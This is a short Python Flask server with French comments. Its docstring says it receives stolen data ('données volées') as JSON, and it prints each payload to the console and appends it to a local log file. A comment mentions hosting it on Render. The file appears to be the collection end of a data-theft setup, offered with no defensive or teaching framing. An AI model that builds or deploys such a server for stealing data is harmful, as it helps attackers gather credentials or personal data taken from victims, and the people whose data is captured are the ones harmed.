from flask import Flask, request, jsonify
import json
import datetime
import os
# Si vous voulez enregistrer dans un fichier, il faut une librairie comme 'csv' qui est intégrée

app = Flask(__name__)

# Chemin où les données seront stockées (si vous voulez écrire dans un fichier local)
LOG_FILE = "collected_data.log"

@app.route('/', methods=['GET'])
def home():
    """Endpoint de vérification pour s'assurer que le serveur fonctionne."""
    return jsonify({"status": "Server is running", "message": "Ready to receive data."}), 200

@app.route('/receive_data', methods=['POST'])
def receive_data():
    """
    Endpoint principal pour recevoir les données volées (payload JSON)
    et les enregistrer dans la console/fichier.
    """
    if not request.is_json:
        return jsonify({"error": "Missing JSON in request"}), 400

    data = request.get_json()

    timestamp = datetime.datetime.now().isoformat()
    log_entry = json.dumps({"timestamp": timestamp, "payload": data})

    # 1. Afficher dans la console de Render (le plus simple)
    print("="*40)
    print("--- DONNÉES RÉCUES AVEC SUCCÈS ---")
    print(f"Payload reçu: {data}")
    print("="*40)

    # 2. (Optionnel mais recommandé) Écrire dans un fichier de log pour garder une trace
    try:
        with open(LOG_FILE, "a") as f:
            f.write(log_entry + "\n")
        return jsonify({"status": "success", "message": "Data received and logged locally"}), 201
    except Exception as e:
        return jsonify({"status": "success", "message": "Data received but failed to write to log file"}), 200


if __name__ == '__main__':
    # Pour le test local
    app.run(debug=True, host='0.0.0.0', port=5000)
